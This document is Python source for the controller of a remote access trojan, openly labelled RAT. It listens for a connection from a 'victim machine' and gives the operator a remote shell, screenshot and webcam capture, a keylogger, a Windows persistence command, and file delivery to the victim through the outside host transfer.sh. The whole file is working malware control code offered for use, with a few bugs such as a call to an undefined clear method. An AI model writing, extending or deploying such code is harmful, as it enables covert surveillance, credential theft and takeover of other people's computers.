from socket import socket, AF_INET, SOCK_STREAM
import argparse
import sys
import os
import requests
import time

class RAT:
    def __init__(self, port):
        self.address = ('',port)
        self.port = port
        self.socket = socket(AF_INET, SOCK_STREAM)

    def banner(self):
        print('''	
 @@@@@                                        @@@@@
@@@@@@@                                      @@@@@@@
@@@@@@@           @@@@@@@@@@@@@@@            @@@@@@@
 @@@@@@@@       @@@@@@@@@@@@@@@@@@@        @@@@@@@@
     @@@@@     @@@@@@@@@@@@@@@@@@@@@     @@@@@
       @@@@@  @@@@@@@@@@@@@@@@@@@@@@@  @@@@@
         @@  @@@@@@@@@@@@@@@@@@@@@@@@@  @@
            @@@@@@@    @@@@@@    @@@@@@
            @@@@@@      @@@@      @@@@@
            @@@@@@      @@@@      @@@@@
             @@@@@@    @@@@@@    @@@@@
              @@@@@@@@@@@  @@@@@@@@@@
               @@@@@@@@@@  @@@@@@@@@
           @@   @@@@@@@@@@@@@@@@@   @@
           @@@@  @@@@ @ @ @ @ @@@@  @@@@
          @@@@@   @@@ @ @ @ @ @@@   @@@@@
        @@@@@      @@@@@@@@@@@@@      @@@@@
      @@@@          @@@@@@@@@@@          @@@@
   @@@@@              @@@@@@@              @@@@@
  @@@@@@@                                 @@@@@@@
   @@@@@                                   @@@@@''')

    def listen(self):
        s = self.socket
        s.bind(self.address)
        s.listen()
        print('Listening on port: %i'%self.port)
        self.conn, self.addr = s.accept()
        print('[+] Connection received from',self.addr)
        self.main()
    
    def help(self):
        print('help:\tshow this message')
        print('clear:\tclear console')            
        print('shell:\topen shell on victim machine')
        print('screenshot:\ttake screenshot from victim machine')
        print('webcam:\ttake picture from victims webcam')
        print('send_file:\tsend file to victim machine')
        print('persistence:\trun persistence script (windows only)')
        print('keylogger:\trun keylogger on victim machine')
        print()

    def main(self):
        print()
        while 1:
            EXIT = False
            conn = self.conn
            cmd = input('pirate> ')
            if cmd == 'shell':
                while EXIT != True:
                    cmd = input('shell@%s# '%self.addr[0])
                    if cmd == 'exit':
                        EXIT = True
                    elif cmd == '' or cmd == ' ':
                        pass
                    else:
                        conn.send(('shell:'+cmd).encode())
                        print(conn.recv(50000).decode('Latin-1'))
            elif cmd == 'clear':
                if sys.platform.startswith('win'):
                    os.system('cls')
                else:
                    os.system('clear')
            elif cmd == 'help':
                self.help()

            elif cmd == 'screenshot':
                runtime = time.asctime()[11:].replace(' ','-').replace(':','-')
                filename = 'screenshot-%s.png'%runtime
                conn.send('screenshot'.encode())
                url = conn.recv(1024).decode()
                content = requests.get(url).content
                with open(filename,'wb') as img:
                    img.write(content)
                    img.close()
                print('screenshot saved as: %s\n'%filename)
            
            elif cmd == 'webcam':
                runtime = time.asctime()[11:].replace(' ','-').replace(':','-')
                filename = 'image-%s.jpg'%runtime
                conn.send(cmd.encode())
                url = conn.recv(1024).decode()
                content = requests.get(url).content
                with open(filename,'wb') as img:
                    img.write(content)
                    img.close()
                print('webcam image saved as: %s\n'%filename)

            elif cmd.startswith('send_file'):
                if cmd == 'send_file':
                    print('Usage: send_file <file_name>\n')
                if len(cmd.split(' ')) == 2:
                    filename = cmd.split(' ')[1]
                    if os.path.isfile(filename):
                        url = 'https://transfer.sh/'
                        data = open(filename, 'rb')
                        upload = {filename: data}
                        response = requests.post(url, files=upload)
                        data.close()
                        download_link = response.content.decode('utf-8')
                        conn.send(('file:'+download_link).encode())
                        print('File sended!')
                    else:
                        print('Error!\nFile not found!')
            
            elif cmd == 'persistence':
                conn.send(cmd.encode())
                msg = conn.recv(1024).decode()
                print(msg)
            
            elif cmd.startswith('keylogger'):
                if cmd == 'keylogger':
                    print('Usage:')
                    print('keylogger --start')
                    print('keylogger --dump')
                    print('kelogger --stop')
                elif cmd.startswith('keylogger --'):
                    msg = 'keylogger:'+cmd.split('--')[1]            
                    conn.send(msg)
            elif cmd == '':
                pass
            else:
                print('Invalid command!\n')
    
def init():
    parser = argparse.ArgumentParser()
    parser.add_argument('-l','--listen', type=int, help='Start listener')
    args = parser.parse_args()
    return args

args = init()
if args!=None:
    port = args.listen
    main = RAT(port)
    main.clear()
    main.banner()
    main.listen()
    

